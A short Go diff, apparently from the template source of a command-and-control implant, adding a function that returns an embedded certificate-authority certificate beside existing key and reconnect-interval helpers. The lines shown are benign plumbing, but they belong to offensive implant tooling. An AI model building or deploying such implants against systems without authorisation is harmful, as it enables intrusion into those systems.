@@ -187,6 +187,11 @@ func GetImplantPrivateKey() []byte {
 	return []byte(keyPEM)
 }
 
+// GetImplantCACert returns the Implant Certificate Authority
+func GetImplantCACert() []byte {
+	return []byte(caCertPEM)
+}
+
 func GetReconnectInterval() time.Duration {
 	reconnect, err := strconv.Atoi(`{{.Config.ReconnectInterval}}`)
 	if err != nil {
